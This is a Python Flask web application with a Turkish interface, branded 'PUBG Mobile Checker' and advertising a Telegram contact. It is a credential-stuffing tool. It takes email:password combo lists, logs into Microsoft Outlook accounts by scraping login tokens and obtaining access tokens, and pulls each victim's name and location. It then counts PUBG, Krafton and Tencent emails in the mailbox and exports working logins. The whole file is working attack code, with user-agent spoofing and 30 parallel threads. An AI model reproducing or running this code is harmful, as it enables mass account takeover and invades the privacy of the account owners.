import os
import re
import json
import uuid
import random
import time
import hashlib
import string
import requests
from flask import Flask, request, jsonify, render_template_string, send_file
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from io import StringIO, BytesIO

app = Flask(__name__)

# ==================== KONFIGURASYON ====================
CONFIG = {
    "max_workers": 30,
    "timeout": 15,
    "retry_count": 3
}

# ==================== İSTATİSTİKLER ====================
stats = {
    "total_checked": 0,
    "valid_accounts": 0,
    "pubg_accounts": 0,
    "bad_accounts": 0,
    "results": [],
    "start_time": None,
    "last_check": None
}

# ==================== PUBG MOBILE GÖNDERİCİLER ====================
PUBG_SENDERS = [
    "noreply@pubgmobile.com",
    "no-reply@pubgmobile.com",
    "pubgmobile@news.pubg.com",
    "pubgmobile@info.pubg.com",
    "pubgmobile@promotions.pubg.com",
    "pubgmobile@events.pubg.com",
    "tencentgames.com",
    "levelinfinite.com",
    "krafton.com"
]

# ==================== GÜÇLÜ USER-AGENT LİSTESİ ====================
USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)"
]

# ==================== FONKSİYONLAR ====================

def get_random_user_agent():
    """Rastgele güçlü User-Agent döndürür"""
    return random.choice(USER_AGENTS)

def get_random_headers():
    """Rastgele header oluşturur"""
    return {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"'
    }

def get_microsoft_session():
    """Microsoft session oluşturur"""
    session = requests.Session()
    session.headers.update(get_random_headers())
    return session

def check_microsoft_account(email, password):
    """Microsoft hesabını kontrol eder ve token alır"""
    try:
        session = get_microsoft_session()
        
        # 1. Authorize isteği
        params = {
            "client_info": "1",
            "haschrome": "1",
            "login_hint": email,
            "mkt": "en",
            "response_type": "code",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
        }
        
        response = session.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize",
            params=params,
            timeout=CONFIG["timeout"]
        )
        
        if response.status_code != 200:
            return None, None, False
        
        html = response.text
        
        # PPFT al
        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html)
        if not ppft_match:
            return None, None, False
        ppft = ppft_match.group(1)
        
        # URL Post al
        url_post_match = re.search(r"urlPost:'([^']+)'", html)
        if not url_post_match:
            return None, None, False
        url_post = url_post_match.group(1)
        
        cookies = response.cookies.get_dict()
        
        # 2. Login isteği
        login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft}&PPSX=PassportR&type=11&LoginOptions=1"
        
        login_headers = {
            "Host": "login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": get_random_user_agent(),
            "Cookie": "; ".join([f"{k}={v}" for k, v in cookies.items()])
        }
        
        login_response = session.post(
            url_post,
            data=login_data,
            headers=login_headers,
            allow_redirects=False,
            timeout=CONFIG["timeout"]
        )
        
        # 3. Token al
        location = login_response.headers.get('Location', '')
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return None, None, False
            
        code = code_match.group(1)
        cid = cookies.get('MSPCID', '').upper()
        
        # 4. Access token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        token_response = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=CONFIG["timeout"]
        )
        
        token_json = token_response.json()
        access_token = token_json.get("access_token")
        
        if access_token:
            return access_token, cid, True
        else:
            return None, None, False
            
    except Exception as e:
        print(f"Microsoft kontrol hatası {email}: {str(e)}")
        return None, None, False

def check_pubg_emails(email, password, token, cid):
    """PUBG Mobile maillerini kontrol eder"""
    try:
        headers = {
            "User-Agent": get_random_user_agent(),
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate"
        }
        
        # Profil bilgileri
        profile_response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=CONFIG["timeout"]
        )
        profile_data = profile_response.json() if profile_response.status_code == 200 else {}
        
        name = "Bilinmiyor"
        location = "Bilinmiyor"
        if profile_data.get('names'):
            name = profile_data['names'][0].get('displayName', 'Bilinmiyor')
        if profile_data.get('accounts'):
            location = profile_data['accounts'][0].get('location', 'Bilinmiyor')
        
        # Outlook startup data
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        startup_headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": cid,
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": get_random_user_agent(),
            "action": "StartupData",
            "x-owa-correlationid": cid,
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        
        startup_response = requests.post(
            url,
            headers=startup_headers,
            data="",
            timeout=CONFIG["timeout"]
        )
        
        response_text = startup_response.text if startup_response.status_code == 200 else ""
        
        # PUBG Mobile maillerini say
        domain_counts = {}
        total_count = 0
        
        for sender in PUBG_SENDERS:
            count = response_text.count(sender)
            if count > 0:
                domain_counts[sender] = count
                total_count += count
        
        return {
            "is_valid": True,
            "has_pubg": total_count > 0,
            "name": name,
            "location": location,
            "total_count": total_count,
            "domain_counts": domain_counts
        }
        
    except Exception as e:
        return {
            "is_valid": False,
            "error": str(e)
        }

def check_single_account(email, password):
    """Tek bir hesabı kontrol eder"""
    global stats
    
    stats["total_checked"] += 1
    
    # Microsoft kontrolü
    token, cid, is_valid = check_microsoft_account(email, password)
    
    if not is_valid or not token:
        stats["bad_accounts"] += 1
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": "Microsoft login failed"
        }
    
    # PUBG mail kontrolü
    result = check_pubg_emails(email, password, token, cid)
    
    if result.get("is_valid", False):
        if result.get("has_pubg", False):
            stats["pubg_accounts"] += 1
            stats["valid_accounts"] += 1
            return {
                "status": "valid",
                "type": "pubg_mobile",
                "email": email,
                "password": password,
                "name": result.get("name", "Bilinmiyor"),
                "location": result.get("location", "Bilinmiyor"),
                "total_pubg_mails": result.get("total_count", 0),
                "domain_counts": result.get("domain_counts", {})
            }
        else:
            stats["valid_accounts"] += 1
            return {
                "status": "valid",
                "type": "non_pubg",
                "email": email,
                "password": password,
                "name": result.get("name", "Bilinmiyor"),
                "location": result.get("location", "Bilinmiyor")
            }
    else:
        stats["bad_accounts"] += 1
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": "Check failed",
            "error": result.get("error", "Unknown error")
        }

def check_accounts_from_file(file_content):
    """Dosya içeriğinden hesapları kontrol eder"""
    results = []
    accounts = []
    
    lines = file_content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if email and password:
                    accounts.append({"email": email, "password": password})
    
    if not accounts:
        return {"error": "Geçerli hesap bulunamadı"}
    
    # Thread pool ile kontrol et
    with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = []
        for account in accounts:
            futures.append(executor.submit(
                check_single_account, 
                account["email"], 
                account["password"]
            ))
        
        for future in futures:
            try:
                result = future.result(timeout=CONFIG["timeout"] + 5)
                results.append(result)
                stats["results"].append(result)
            except Exception as e:
                results.append({"error": str(e)})
    
    stats["last_check"] = datetime.now().isoformat()
    return {"results": results, "total": len(results)}

def generate_html_page():
    """HTML sayfasını oluşturur"""
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎯 PUBG Mobile Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            background-image: radial-gradient(circle at 10% 20%, rgba(255, 215, 0, 0.03) 0%, transparent 50%);
        }
        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
        
        /* Header */
        .header {
            text-align: center;
            padding: 30px 20px;
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border-radius: 16px;
            margin-bottom: 30px;
            border: 1px solid #333;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.05), transparent);
            animation: rotate 20s linear infinite;
        }
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
            z-index: 1;
        }
        .header p {
            color: #888;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }
        
        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: linear-gradient(135deg, #1a1a1a, #222);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #333;
            transition: all 0.3s;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            border-color: #ffd700;
        }
        .stat-box .number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-box .label { color: #888; font-size: 13px; }
        .stat-box.gold .number { color: #ffd700; }
        .stat-box.green .number { color: #00ff88; }
        .stat-box.blue .number { color: #0088ff; }
        .stat-box.red .number { color: #ff0044; }
        
        /* Sections */
        .section {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        .section h2 {
            color: #ffd700;
            margin-bottom: 15px;
            font-size: 22px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section h2 .badge {
            font-size: 12px;
            background: #ffd70022;
            color: #ffd700;
            padding: 2px 12px;
            border-radius: 12px;
            border: 1px solid #ffd70044;
        }
        
        /* Forms */
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            color: #888;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0a0a0a;
            color: #fff;
            font-size: 14px;
            font-family: inherit;
            transition: border-color 0.3s;
        }
        .form-group input:focus, .form-group textarea:focus {
            outline: none;
            border-color: #ffd700;
        }
        .form-group textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        /* Buttons */
        .btn {
            display: inline-block;
            padding: 12px 30px;
            border-radius: 8px;
            border: none;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            text-align: center;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            color: #000;
        }
        .btn-primary:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(255, 215, 0, 0.3);
        }
        .btn-success {
            background: #00ff88;
            color: #000;
        }
        .btn-success:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
        }
        .btn-danger {
            background: #ff0044;
            color: #fff;
        }
        .btn-danger:hover {
            transform: scale(1.03);
            box-shadow: 0 0 25px rgba(255, 0, 68, 0.3);
        }
        .btn-secondary {
            background: #333;
            color: #fff;
        }
        .btn-secondary:hover {
            background: #444;
        }
        .btn-block {
            width: 100%;
        }
        
        /* Results */
        .result-item {
            padding: 12px 15px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            transition: background 0.3s;
        }
        .result-item:hover { background: #222; }
        .result-item .email { color: #00ff88; font-weight: bold; }
        .result-item .pass { color: #ffd700; }
        .result-item .info { color: #888; font-size: 12px; }
        .status-badge {
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        .status-badge.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .status-badge.pubg { background: #ffd70022; color: #ffd700; border: 1px solid #ffd700; }
        .status-badge.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        
        .results-container {
            max-height: 400px;
            overflow-y: auto;
            border-radius: 8px;
            border: 1px solid #222;
        }
        .results-container::-webkit-scrollbar {
            width: 6px;
        }
        .results-container::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        .results-container::-webkit-scrollbar-thumb {
            background: #ffd700;
            border-radius: 3px;
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .tab-btn {
            padding: 8px 20px;
            border: none;
            border-radius: 8px;
            background: transparent;
            color: #888;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }
        .tab-btn:hover { color: #fff; background: #222; }
        .tab-btn.active {
            background: #ffd70022;
            color: #ffd700;
            border: 1px solid #ffd70044;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 30px;
            color: #555;
            border-top: 1px solid #222;
            margin-top: 30px;
        }
        .footer a {
            color: #ffd700;
            text-decoration: none;
        }
        
        /* Responsive */
        @media (max-width: 600px) {
            .form-row { grid-template-columns: 1fr; }
            .header h1 { font-size: 32px; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>🎯 PUBG Mobile Checker</h1>
            <p>Krafton • Tencent • Level Infinite • PUBG Mobile Hesap Kontrol</p>
            <p style="font-size: 12px; color: #444; margin-top: 10px;">
                Gerçek Microsoft hesapları • PUBG mail tespiti • Anlık sonuçlar
            </p>
        </div>
        
        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-box gold">
                <div class="number">{{ stats.total_checked }}</div>
                <div class="label">📊 Toplam Kontrol</div>
            </div>
            <div class="stat-box green">
                <div class="number">{{ stats.valid_accounts }}</div>
                <div class="label">✅ Geçerli Hesap</div>
            </div>
            <div class="stat-box blue">
                <div class="number">{{ stats.pubg_accounts }}</div>
                <div class="label">🎮 PUBG Mobile</div>
            </div>
            <div class="stat-box red">
                <div class="number">{{ stats.bad_accounts }}</div>
                <div class="label">❌ Başarısız</div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="section">
            <h2>🚀 Hesap Kontrol</h2>
            
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('single')">📝 Tek Hesap</button>
                <button class="tab-btn" onclick="switchTab('bulk')">📂 Toplu Kontrol</button>
                <button class="tab-btn" onclick="switchTab('file')">📄 Dosya Yükle</button>
            </div>
            
            <!-- Single Check -->
            <div id="tab-single" class="tab-content active">
                <div class="form-row">
                    <div class="form-group">
                        <label>📧 Email / Kullanıcı Adı</label>
                        <input type="text" id="singleEmail" placeholder="ornek@email.com">
                    </div>
                    <div class="form-group">
                        <label>🔑 Şifre</label>
                        <input type="password" id="singlePassword" placeholder="Şifrenizi girin">
                    </div>
                </div>
                <button class="btn btn-primary btn-block" onclick="checkSingle()">
                    🔍 Hesabı Kontrol Et
                </button>
            </div>
            
            <!-- Bulk Check -->
            <div id="tab-bulk" class="tab-content">
                <div class="form-group">
                    <label>📝 Hesapları Girin (Her satırda email:şifre)</label>
                    <textarea id="bulkAccounts" placeholder="ornek1@email.com:şifre1&#10;ornek2@email.com:şifre2&#10;ornek3@email.com:şifre3"></textarea>
                </div>
                <button class="btn btn-success btn-block" onclick="checkBulk()">
                    🔍 Hepsini Kontrol Et
                </button>
            </div>
            
            <!-- File Upload -->
            <div id="tab-file" class="tab-content">
                <div class="form-group">
                    <label>📄 Combo Dosyası Seç (email:şifre)</label>
                    <input type="file" id="fileInput" accept=".txt" style="padding: 10px;">
                </div>
                <button class="btn btn-primary btn-block" onclick="checkFile()">
                    📤 Dosyayı Yükle ve Kontrol Et
                </button>
            </div>
        </div>
        
        <!-- Results -->
        {% if stats.results %}
        <div class="section">
            <h2>
                📋 Sonuçlar
                <span class="badge">{{ stats.results|length }} hesap</span>
                <span class="badge" style="background: #00ff8822; color: #00ff88;">
                    🎮 {{ stats.pubg_accounts }} PUBG
                </span>
            </h2>
            <div class="results-container">
                {% for result in stats.results[:50] %}
                <div class="result-item">
                    <span>
                        <span class="email">{{ result.get('email', 'N/A') }}</span>
                        <span style="color: #555;">|</span>
                        <span class="pass">{{ result.get('password', 'N/A') }}</span>
                        {% if result.get('name') and result.get('name') != 'Bilinmiyor' %}
                        <span style="color: #888; margin-left: 10px;">👤 {{ result.get('name') }}</span>
                        {% endif %}
                        {% if result.get('location') and result.get('location') != 'Bilinmiyor' %}
                        <span style="color: #888;">📍 {{ result.get('location') }}</span>
                        {% endif %}
                        {% if result.get('total_pubg_mails', 0) > 0 %}
                        <span style="color: #ffd700;">📬 {{ result.get('total_pubg_mails') }} mail</span>
                        {% endif %}
                    </span>
                    <div>
                        {% if result.get('status') == 'valid' %}
                            {% if result.get('type') == 'pubg_mobile' %}
                                <span class="status-badge pubg">🎮 PUBG</span>
                            {% else %}
                                <span class="status-badge valid">✅ Geçerli</span>
                            {% endif %}
                        {% else %}
                            <span class="status-badge invalid">❌ Geçersiz</span>
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <!-- API Info -->
        <div class="section">
            <h2>📡 API Kullanımı</h2>
            <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: auto;">
                <div style="color: #00ff88;"># Tek hesap kontrolü</div>
                <div style="color: #888;">POST /api/check</div>
                <div style="color: #555;">{</div>
                <div style="color: #888; padding-left: 20px;">"email": "ornek@email.com",</div>
                <div style="color: #888; padding-left: 20px;">"password": "sifre"</div>
                <div style="color: #555;">}</div>
                <br>
                <div style="color: #00ff88;"># Toplu kontrol</div>
                <div style="color: #888;">POST /api/check-bulk</div>
                <div style="color: #555;">{</div>
                <div style="color: #888; padding-left: 20px;">"accounts": [</div>
                <div style="color: #888; padding-left: 40px;">{"email": "ornek1@email.com", "password": "sifre1"},</div>
                <div style="color: #888; padding-left: 40px;">{"email": "ornek2@email.com", "password": "sifre2"}</div>
                <div style="color: #888; padding-left: 20px;">]</div>
                <div style="color: #555;">}</div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p>📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></p>
            <p style="font-size: 12px; margin-top: 10px;">PUBG Mobile Checker v3.0 • Gerçek Microsoft Hesap Kontrolü</p>
        </div>
    </div>
    
    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.add('active');
            event.target.classList.add('active');
        }
        
        async function checkSingle() {
            const email = document.getElementById('singleEmail').value.trim();
            const password = document.getElementById('singlePassword').value.trim();
            
            if (!email || !password) {
                alert('Lütfen email ve şifre girin!');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ Kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await response.json();
                alert('✅ Kontrol tamamlandı!\n' + JSON.stringify(data.result, null, 2));
                location.reload();
            } catch (error) {
                alert('❌ Hata: ' + error);
            } finally {
                btn.textContent = '🔍 Hesabı Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkBulk() {
            const text = document.getElementById('bulkAccounts').value.trim();
            if (!text) {
                alert('Lütfen hesapları girin!');
                return;
            }
            
            const lines = text.split('\\n').filter(line => line.trim());
            const accounts = lines.map(line => {
                const parts = line.split(':');
                return { email: parts[0].trim(), password: parts[1]?.trim() || '' };
            }).filter(acc => acc.email && acc.password);
            
            if (accounts.length === 0) {
                alert('Geçerli hesap bulunamadı!');
                return;
            }
            
            const btn = event.target;
            btn.textContent = '⏳ ' + accounts.length + ' hesap kontrol ediliyor...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/api/check-bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accounts })
                });
                const data = await response.json();
                alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
                      '🎮 PUBG: ' + data.pubg_count + '\\n' +
                      '✅ Geçerli: ' + data.valid_count + '\\n' +
                      '❌ Geçersiz: ' + (data.total - data.valid_count));
                location.reload();
            } catch (error) {
                alert('❌ Hata: ' + error);
            } finally {
                btn.textContent = '🔍 Hepsini Kontrol Et';
                btn.disabled = false;
            }
        }
        
        async function checkFile() {
            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];
            
            if (!file) {
                alert('Lütfen bir dosya seçin!');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = async function(e) {
                const content = e.target.result;
                const btn = event.target;
                btn.textContent = '⏳ Dosya kontrol ediliyor...';
                btn.disabled = true;
                
                try {
                    const response = await fetch('/api/check-file', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ file_content: content })
                    });
                    const data = await response.json();
                    alert('✅ Dosya kontrol edildi!\\n' +
                          '📊 Toplam: ' + data.total + '\\n' +
                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
                          '✅ Geçerli: ' + data.valid_count);
                    location.reload();
                } catch (error) {
                    alert('❌ Hata: ' + error);
                } finally {
                    btn.textContent = '📤 Dosyayı Yükle ve Kontrol Et';
                    btn.disabled = false;
                }
            };
            reader.readAsText(file);
        }
    </script>
</body>
</html>
    """

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Ana sayfa"""
    return render_template_string(generate_html_page(), stats=stats)

@app.route('/api/status', methods=['GET'])
def status():
    """API durumu"""
    uptime = None
    if stats["start_time"]:
        uptime = str(datetime.now() - stats["start_time"])
    
    return jsonify({
        "status": "online",
        "uptime": uptime,
        "stats": {
            "total_checked": stats["total_checked"],
            "valid_accounts": stats["valid_accounts"],
            "pubg_accounts": stats["pubg_accounts"],
            "bad_accounts": stats["bad_accounts"],
            "last_check": stats["last_check"]
        },
        "config": {
            "max_workers": CONFIG["max_workers"],
            "timeout": CONFIG["timeout"]
        }
    })

@app.route('/api/check', methods=['POST'])
def check_single_api():
    """Tek hesap kontrolü API"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({"error": "email and password required"}), 400
        
        result = check_single_account(email, password)
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "result": result
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-bulk', methods=['POST'])
def check_bulk_api():
    """Toplu hesap kontrolü API"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        accounts = data.get('accounts', [])
        if not accounts:
            return jsonify({"error": "accounts list required"}), 400
        
        if len(accounts) > 100:
            return jsonify({"error": "Maximum 100 accounts per request"}), 400
        
        results = []
        valid_count = 0
        pubg_count = 0
        
        with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
            futures = []
            for acc in accounts:
                email = acc.get('email', '').strip()
                password = acc.get('password', '').strip()
                if email and password:
                    futures.append(executor.submit(check_single_account, email, password))
            
            for future in futures:
                try:
                    result = future.result(timeout=CONFIG["timeout"] + 5)
                    results.append(result)
                    stats["results"].append(result)
                    if result.get("status") == "valid":
                        valid_count += 1
                        if result.get("type") == "pubg_mobile":
                            pubg_count += 1
                except Exception as e:
                    results.append({"error": str(e)})
        
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "total": len(results),
            "valid_count": valid_count,
            "pubg_count": pubg_count,
            "results": results
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-file', methods=['POST'])
def check_file_api():
    """Dosya içeriğinden kontrol API"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        file_content = data.get('file_content', '')
        if not file_content:
            return jsonify({"error": "file_content required"}), 400
        
        result = check_accounts_from_file(file_content)
        
        if "error" in result:
            return jsonify({"error": result["error"]}), 400
        
        valid_count = sum(1 for r in result["results"] if r.get("status") == "valid")
        pubg_count = sum(1 for r in result["results"] if r.get("status") == "valid" and r.get("type") == "pubg_mobile")
        
        return jsonify({
            "success": True,
            "total": result["total"],
            "valid_count": valid_count,
            "pubg_count": pubg_count,
            "results": result["results"]
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/stats/reset', methods=['POST'])
def reset_stats():
    """İstatistikleri sıfırla"""
    global stats
    stats = {
        "total_checked": 0,
        "valid_accounts": 0,
        "pubg_accounts": 0,
        "bad_accounts": 0,
        "results": [],
        "start_time": datetime.now(),
        "last_check": None
    }
    return jsonify({"success": True, "message": "İstatistikler sıfırlandı"})

@app.route('/api/export', methods=['GET'])
def export_results():
    """Sonuçları txt dosyası olarak dışa aktar"""
    try:
        output = []
        for result in stats["results"]:
            if result.get("status") == "valid":
                email = result.get("email", "")
                password = result.get("password", "")
                result_type = "PUBG" if result.get("type") == "pubg_mobile" else "VALID"
                output.append(f"{email}:{password} [{result_type}]")
        
        if not output:
            return jsonify({"error": "No valid results to export"}), 404
        
        content = "\n".join(output)
        return send_file(
            BytesIO(content.encode('utf-8')),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f'pubg_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ==================== MAIN ====================

if __name__ == "__main__":
    stats["start_time"] = datetime.now()
    
    port = int(os.environ.get("PORT", 5000))
    
    print("=" * 60)
    print("🎯 PUBG Mobile Checker API Başlatılıyor...")
    print("=" * 60)
    print(f"📡 Port: {port}")
    print(f"⚡ Max Workers: {CONFIG['max_workers']}")
    print(f"⏱️  Timeout: {CONFIG['timeout']}s")
    print(f"📊 PUBG Senders: {len(PUBG_SENDERS)}")
    print(f"🌐 User Agents: {len(USER_AGENTS)}")
    print("📞✈️ Telegram: @rinexdestek")
    print("=" * 60)
    
    app.run(host="0.0.0.0", port=port, debug=False)
